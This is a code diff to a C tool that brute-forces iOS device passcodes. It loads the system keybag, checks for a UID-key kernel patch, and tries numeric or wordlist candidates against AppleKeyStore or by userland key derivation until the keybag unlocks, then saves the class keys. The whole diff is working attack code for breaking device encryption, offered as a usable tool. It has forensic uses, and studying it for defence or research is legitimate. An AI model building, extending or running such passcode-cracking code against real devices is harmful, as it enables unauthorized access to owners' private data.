@@ -2,7 +2,7 @@
 #include <unistd.h>
 #include <sys/types.h>
 #include <CoreFoundation/CoreFoundation.h>
-#include <time.h>
+#include <sys/time.h>
 #include <math.h>
 #include "AppleKeyStore.h"
 #include "IOKit.h"
@@ -24,7 +24,106 @@
  */
 
 const char* def_prog = "/mnt1/private/etc/bruteforce.txt";
-int load = 1;
+
+const size_t passcodeBuffSize = 100;
+
+typedef int (*next_string_func)(void *ctx, char *out, size_t out_size);
+
+typedef struct {
+    next_string_func next;
+    void *ctx;
+} StringSequence;
+
+typedef struct {
+    FILE *fp;
+} FileLineCtx;
+
+typedef struct {
+    long long current;
+    long long max;
+    int len;
+    long long next10;
+} PasscodeCtx;
+
+int PasscodeCtx_init(PasscodeCtx *ctx, char *startCode, long long max) {
+    size_t len = strlen(startCode);
+    if (len < 1 || len > 99999999) {
+        printf("length must be positive\n");
+        return 1;
+    }
+
+    char *end;
+    errno = 0;
+    long long start = strtol(startCode, &end, 10);
+
+    if (end == startCode || errno == ERANGE || *end != '\0') {
+        printf("strtol failed\n");
+        return 1;
+    }
+
+    if (max < start) {
+        printf("max cannot be less than start\n");
+        return 1;
+    }
+
+    int next10 = 1;
+    for (int i = 0; i < len; i++) {
+        next10 *= 10;
+    }
+    if (start >= next10) {
+        printf("len is shorter than size of start\n");
+        return 1;
+    }
+
+    ctx->current = start;
+    ctx->max = max;
+    ctx->len = (int)len;
+    ctx->next10 = next10;
+    return 0;
+}
+
+int next_passcode(void *vctx, char *out, size_t out_size)
+{
+    PasscodeCtx *ctx = (PasscodeCtx *)vctx;
+
+    if (ctx->current >= ctx->max)
+        return 0;
+
+    int n = snprintf(out, out_size, "%0*lld", ctx->len, ctx->current);
+    if (n < 0 || n >= out_size) {
+        printf("not enough space in passcode buffer\n");
+        return 0;
+    }
+    ctx->current++;
+    if (ctx->current >= ctx->next10) {
+        ctx->current = 0;
+        ctx->next10 *= 10;
+        ctx->len++;
+    }
+
+    return 1;
+}
+
+int next_file_line(void *vctx, char *out, size_t out_size)
+{
+    FileLineCtx *ctx = (FileLineCtx *)vctx;
+
+    if (!ctx->fp)
+        return 0;
+
+    if (fgets(out, (int)out_size, ctx->fp) == NULL) {
+        fclose(ctx->fp);
+        return 0;
+    }
+
+    size_t len = strlen(out);
+    while (len > 0 && (out[len - 1] == '\n' || out[len - 1] == '\r')) {
+        out[len - 1] = '\0';
+        len--;
+    }
+
+    return 1;
+}
 
 void saveKeybagInfos(CFDataRef kbkeys, KeyBag* kb, uint8_t* key835, char* passcode, uint8_t* passcodeKey, CFMutableDictionaryRef classKeys)
 {
@@ -66,199 +165,206 @@ void saveKeybagInfos(CFDataRef kbkeys, KeyBag* kb, uint8_t* key835, char* passco
 
 }
 
-void saveProgress(int current, int len, const char* filepath) {
-    FILE* file = fopen(filepath, "w");
-    if (file == NULL) {
-        printf("Failed to open file for saving progress.\n");
-        return;
-    }
-    fprintf(file, "%d\n%d\n", current, len);  // Сохраняем текущее число и длину пароля
-    fclose(file);
+void print_status(char passcode[], int processed, struct timeval start) {
+    struct timeval curr;
+    gettimeofday(&curr, NULL);
+
+    double elapsed =
+        (curr.tv_sec - start.tv_sec) +
+        (curr.tv_usec - start.tv_usec) / 1e6;
+
+    double rate = (elapsed > 0) ? (processed / elapsed) : 0.0;
+
+    printf(
+        "Current: \"%s\". Processed: %d. Elapsed: %.2fs. Rate: %.2f passcodes/sec\n",
+        passcode,
+        processed,
+        elapsed,
+        rate
+    );
 }
 
-int loadProgress(int* len, const char* filepath) {
-    FILE* file = fopen(filepath, "r");
-    if (file == NULL) {
-        printf("No saved progress found. Starting from scratch.\n");
-        return -1;  // Возвращаем 0, если файла нет (начинаем с начала)
-    }
-    
-    int start;
-    if (fscanf(file, "%d\n%d\n", &start, len) != 2) {  // Загружаем стартовое значение и длину
-        printf("Failed to read progress. Starting from scratch.\n");
-        start = -1;  // Если не удается прочитать файл, начинаем с начала
-    } else {
-        printf("Resuming.\n");
-    }
-    
-    fclose(file);
-    return start;
-}
-
-char* bruteforceWithAppleKeyStore(CFDataRef kbkeys)
+char* bruteforceWithAppleKeyStore(CFDataRef kbkeys, StringSequence *seq, int statusEach)
 {
-    printf("Bruteforcing using Keystore (length 4 only)\n");
-    uint64_t keybag_id = 0;
-    int i;
-    char* passcode = (char*) malloc(5);
-    memset(passcode, 0, 5);
+    size_t passcodeSize = passcodeBuffSize;
+    char passcode[passcodeSize];
+    memset(passcode, 0, sizeof(passcode));
 
-    AppleKeyStoreKeyBagInit();
-    int r = AppleKeyStoreKeyBagCreateWithData(kbkeys, &keybag_id);
-    if (r)
-    {
-        printf("AppleKeyStoreKeyBagCreateWithData ret=%x\n", r);
-        free(passcode);
+    uint64_t keybag_id = 0;
+
+    if (AppleKeyStoreKeyBagInit()) {
+        printf("AppleKeyStoreKeyBagInit() failed\n");
+        return NULL;
+    }
+    if (AppleKeyStoreKeyBagCreateWithData(kbkeys, &keybag_id)) {
+        printf("AppleKeyStoreKeyBagCreateWithData() failed\n");
         return NULL;
     }
 
     printf("keybag id=%x\n", (uint32_t) keybag_id);
-    AppleKeyStoreKeyBagSetSystem(keybag_id);
-    
-    CFDataRef data;
-    
-    io_connect_t conn = IOKit_getConnect("AppleKeyStore");
-
-    for(i=0; i < 10000; i++)
-    {
-        sprintf(passcode, "%04d", i);
-        //if (i % 1000 == 0)
-        printf("%s\n", passcode);
-        data = CFDataCreateWithBytesNoCopy(0, (const UInt8*) passcode, 4, kCFAllocatorNull);
-        if (!AppleKeyStoreUnlockDevice(conn, data))
-        {
-            return passcode;
-        }
-    }
-    free(passcode);
-    return NULL;
-}
-
-void measure(double* time, char** measurement) {
-    if (*time > 60) {
-        if (*time > (60 * 60)) {
-            *time /= (60 * 60);
-            *measurement = "hours";
-        } else {
-            *time /= 60;
-            *measurement = "minutes";
-        }
-    } else {
-        *measurement = "seconds";
-    }
-}
-
-char* bruteforceUserland(KeyBag* kb, uint8_t* key835, int len, int start)
-{
-    if (len > 8) {
-        printf("Awww hell naw. Do you really want to wait a year?\n");
+    if (AppleKeyStoreKeyBagSetSystem(keybag_id)) {
+        printf("AppleKeyStoreKeyBagSetSystem() failed\n");
         return NULL;
     }
     
-    int i;
-    char* passcode = (char*) malloc(len + 1);
-    memset(passcode, 0, len + 1);
+    CFDataRef data = NULL;
     
-    int max = pow(10, len);
-    printf("Processing passcodes from %0*d to %d.\n\n\n", len, start, max - 1);
-    
-    bool first = true;
-    int count = 5000;
-    
-    int res = 0;
+    io_connect_t conn = IOKit_getConnect("AppleKeyStore");
+    if (conn == -1) {
+        printf("IOKit_getConnect() failed\n");
+        return NULL;
+    }
 
-    clock_t t;
-    t = clock();
-    for(i = start; i < max; i++)
-    {
-        sprintf(passcode, "%0*d", len, i);
-        if (AppleKeyStore_unlockKeybagFromUserland(kb, passcode, len, key835)) {
-            printf("Finished: %s\n", passcode);
-            return passcode;
+    struct timeval start;
+    gettimeofday(&start, NULL);
+
+    int processed = 0;
+    while (seq->next(seq->ctx, passcode, passcodeSize)) {
+        processed++;
+        data = CFDataCreateWithBytesNoCopy(0, (const UInt8*) passcode, (long)strlen(passcode), kCFAllocatorNull);
+        if (data == NULL) {
+            printf("CFDataCreateWithBytesNoCopy failed\n");
+            return NULL;
         }
-        
-        if (i % count == 0 && i > start) {
-            double elapsed = ((double)clock() - t) / CLOCKS_PER_SEC;
-            double avg = elapsed / (first ? (i - start) : count);
-            double eta = avg * (max - i);
-            
-            char* measE;
-            char* measB;
-            measure(&eta, &measE);
-            measure(&elapsed, &measB);
-
-            first = false;
-            res++;
-            if (res >= 8) {
-                printf("\033[H\033[J");
-                res = 0;
-            }
-            printf("Current passcode: %s. Processed: %d passcodes.\nElapsed time: %f %s.\nAvg time per passcode: %f milliseconds.\nEstimated time left: %f %s.\n\n\n",
-                passcode, i - start, elapsed, measB, avg * 1000, eta, measE);
-            if (load)
-                saveProgress(i, len, def_prog);
-            t = clock();
+        if (!AppleKeyStoreUnlockDevice(conn, data))
+        {
+            printf("Success!: %s\n", passcode);
+            return strdup(passcode);
+        }
+        if (processed % statusEach == 0) {
+            print_status(passcode, processed, start);
         }
     }
+    printf("No valid passcode found\n");
+    return NULL;
+}
+
+char* bruteforceUserland(KeyBag* kb, uint8_t* key835, StringSequence* seq, int statusEach)
+{
+    size_t passcodeSize = passcodeBuffSize;
+    char passcode[passcodeSize];
+    memset(passcode, 0, sizeof(passcode));
+
+    int processed = 0;
     
-    free(passcode);
-    printf("\n\n\n");
-    return bruteforceUserland(kb, key835, len + 1, 0);
+    struct timeval start;
+    gettimeofday(&start, NULL);
+
+    while (seq->next(seq->ctx, passcode, passcodeSize))
+    {
+        processed++;
+        if (AppleKeyStore_unlockKeybagFromUserland(kb, passcode, strlen(passcode), key835)) {
+            printf("Success!: %s\n", passcode);
+            // return a copy
+            return strdup(passcode);
+        }
+
+        if (processed % statusEach == 0) {
+            print_status(passcode, processed, start);
+        }
+    }
+
+    printf("\nNo valid passcode found\n");
+    return NULL;
 }
 
 
 int main(int argc, char* argv[])
 {
-    printf("\033[H\033[J");
-
+    int ret = 1;
     u_int8_t passcodeKey[32]={0};
     char* passcode = NULL;
+    StringSequence* seq = NULL;
     int bruteforceMethod = 0;
     int showImages = 0;
-    int len = 4;
-    int start = -1;
+    char *start = NULL;
+    char *wordlist = NULL;
+    int statusEach = 1;
     int c;
+    KeyBag* kb = NULL;
+    CFDictionaryRef kbdict = NULL;
     
-    while ((c = getopt (argc, argv, "uinr:")) != -1)
+    while ((c = getopt (argc, argv, "uir:w:p:")) != -1)
     {
-        switch (c)
-        {
+        switch (c) {
             case 'u':
                 bruteforceMethod = 1;
                 break;
             case 'i':
                 showImages = 1;
                 break;
-            case 'n':
-                printf("Not loading progress\n");
-                load = 0;
-                break;
             case 'r':
-                start = atoi(optarg);
-                if (start < 0) {
-                    printf("Invalid start passcode specified. Please provide a positive value.\n");
-                    return 1;
+                start = strdup(optarg);
+                break;
+            case 'w':
+                wordlist = strdup(optarg);
+                break;
+            case 'p':
+                statusEach = atoi(optarg);
+                if (statusEach <= 0) {
+                    statusEach = 1;
                 }
-                len = strlen(optarg);
                 break;
             default:
-                printf("Usage: %s [-u] [-i] [-n] [-r startPasscode]\n", argv[0]);
-                return 1;
+                printf("Usage: %s [-u] [-i] [-r startPasscode] [-w -|wordlistPath] [-p progressEach]\n", argv[0]);
+                goto cleanup;
         }
     }
-    
-    if (load)
-        start = loadProgress(&len, def_prog);
-    
+    if (showImages && wordlist != NULL) {
+        printf("cannot use both -i and -w flags\n");
+        goto cleanup;
+    }
+
+    if (wordlist == NULL) {
+        if (start == NULL) {
+            start = strdup("0000");
+        }
+        PasscodeCtx ctx;
+        if (PasscodeCtx_init(&ctx, start, 99999999)) {
+            printf("Failed to initialize passcode context\n");
+            goto cleanup;
+        }
+        seq = &(StringSequence){ .next = next_passcode, .ctx = &ctx};
+    } else {
+        seq = &(StringSequence){};
+        FILE* fp = NULL;
+        FileLineCtx ctx;
+        if (strcmp(wordlist, "-") == 0) {
+            fp = stdin;
+        } else {
+            fp = fopen(wordlist, "r");
+            if (!fp) {
+                printf("Unable to open wordlist");
+                goto cleanup;
+            }
+        }
+
+        ctx.fp = fp;
+        seq->next = next_file_line;
+        seq->ctx = &ctx;
+        if (start != NULL) {
+            char skippedPasscode[passcodeBuffSize];
+            while (true) {
+                if (!seq->next(seq->ctx, skippedPasscode, passcodeBuffSize)) {
+                    printf("start passcode not found in wordlist\n");
+                    goto cleanup;
+                }
+                if (strcmp(skippedPasscode, start) == 0) {
+                    break;
+                }
+            }
+        }
+    }
+
     uint8_t* key835 = IOAES_key835();
     
     if (!memcmp(key835, "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 16))
     {
         printf("FAIL: missing UID kernel patch\n");
-        return -1;
+        goto cleanup;
     }
     
-    CFDictionaryRef kbdict = AppleKeyStore_loadKeyBag("/private/var/keybags","systembag");
+    kbdict = AppleKeyStore_loadKeyBag("/private/var/keybags","systembag");
     
     if (kbdict == NULL)
     {
@@ -268,7 +374,7 @@ int main(int argc, char* argv[])
         if (kbdict == NULL)
         {
             printf("FAILed to load keybag\n");
-            return -1;
+            goto cleanup;
         }
     }
     
@@ -277,21 +383,21 @@ int main(int argc, char* argv[])
     if (kbkeys == NULL)
     {
         printf("FAIL: KeyBagKeys not found\n");
-        return -1;
+        goto cleanup;
     }
     //write_file("kbblob.bin", CFDataGetBytePtr(kbkeys), CFDataGetLength(kbkeys));    
-    KeyBag* kb = AppleKeyStore_parseBinaryKeyBag(kbkeys);
+    kb = AppleKeyStore_parseBinaryKeyBag(kbkeys);
     if (kb == NULL)
     {
         printf("FAIL: AppleKeyStore_parseBinaryKeyBag\n");
-        return -1;
+        goto cleanup;
     }
     
     //save all we have for now
     //saveKeybagInfos(kbkeys, kb, key835, NULL, NULL, NULL);
     
-    CFDataRef opaque = CFDictionaryGetValue(kbdict, CFSTR("OpaqueStuff"));
     int keyboardType = 0;
+    CFDataRef opaque = CFDictionaryGetValue(kbdict, CFSTR("OpaqueStuff"));
     if (opaque != NULL)
     {
         CFPropertyListRef opq = CFPropertyListCreateWithData(kCFAllocatorDefault, opaque, kCFPropertyListImmutable, NULL, NULL);
@@ -302,52 +408,43 @@ int main(int argc, char* argv[])
             CFRelease(opq);
         }
     }
-    //printf("keyboardType=%d\n", keyboardType);
-    
-    if (keyboardType >= 2) {
-        printf("Alphanumeric password was chosen. Exit\n");
-        return 0;
+
+    /*
+     * keyboard types
+     * 0: "4 digits",
+     * 1: "n digits",
+     * 2: "n alphanum"
+     */
+
+    printf("keyboardType=%d\n", keyboardType);
+
+    if (keyboardType == 0 && start != NULL && (strlen(start) < 4 || strlen(start) > 6)) {
+        printf("Start password is too long or too short.\n");
+        goto cleanup;
     }
-    
+
     if (showImages == 0) {
-        clock_t t;
-        t = clock();
-        if (bruteforceMethod == 0) {
+        if (bruteforceMethod == 1) {
             printf("Bruteforcing using manual derivation\n");
-            if (keyboardType == 0) {
-                if (len > 6 || len < 4) {
-                    printf("Start password is too long or too short.\n");
-                    return 1;
-                }
-                passcode = bruteforceUserland(kb, key835, len, start >= 0 ? start : 0);
-            } else {
-                if (start >= 0)
-                    passcode = bruteforceUserland(kb, key835, len, start);
-                else
-                    passcode = bruteforceUserland(kb, key835, 1, 0);
-            }
+            passcode = bruteforceUserland(kb, key835, seq, statusEach);
+        } else {
+            printf("Bruteforcing using Keystore\n");
+            passcode = bruteforceWithAppleKeyStore(kbkeys, seq, statusEach);
         }
-        else
-            passcode = bruteforceWithAppleKeyStore(kbkeys);
-        
-        double total = ((double)clock() - t) / CLOCKS_PER_SEC;
-        char* time;
-        measure(&total, &time);
-        printf("Total time taken: %f %s.\n", total, time);
     } else {
         printf("Enter passcode: \n");
-        passcode = malloc(100);
-        fgets(passcode, 99, stdin);
+        passcode = malloc(passcodeBuffSize);
+        fgets(passcode, (int)passcodeBuffSize-1, stdin);
         passcode[strlen(passcode)-1] = 0;
     }
     if (passcode != NULL)
     {
         if (!strcmp(passcode, ""))
             printf("No passcode set\n");
-            
+
         if(!AppleKeyStore_unlockKeybagFromUserland(kb, passcode, strlen(passcode), key835))
         {
-            printf("Invalid passcode !\n");
+            printf("Invalid passcode: %s!\n", passcode);
         }
         else
         {
@@ -369,13 +466,15 @@ int main(int argc, char* argv[])
             //save all we have for now
             saveKeybagInfos(kbkeys, kb, key835, passcode, passcodeKey, classKeys);
             CFRelease(classKeys);
+	    ret = 0;
         }
-
-        free(passcode);
     }
-    free(kb);
 
+cleanup:
     CFRelease(kbdict);
-
-    return 0;
+    free(passcode);
+    free(start);
+    free(wordlist);
+    free(kb);
+    return ret;
 }
